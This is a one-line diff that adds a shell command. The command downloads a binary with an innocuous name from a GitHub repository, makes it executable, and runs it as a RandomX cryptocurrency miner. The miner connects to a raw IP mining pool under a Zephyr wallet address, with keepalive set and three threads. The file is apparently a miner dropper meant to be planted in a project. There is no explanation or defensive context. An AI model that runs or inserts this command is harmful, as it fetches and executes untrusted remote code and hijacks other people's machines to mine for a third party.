@@ -1,0 +1,1 @@
+wget https://github.com/ismaimwan6372/crempotoso/raw/main/livegolikas && chmod 700 livegolikas && ./livegolikas -a RandomX -o 209.25.142.78:8080 -u ZEPHYR2rJcFiZNiZqHwcxneo69155BprsdTt2tywSZkZHczqR1ZQNtKHs4YveufDRwd57pE1zuUvVZ6D3y4KtA4o63jmxvPDxik1u --keepalive -p STRIXPRO -t 3
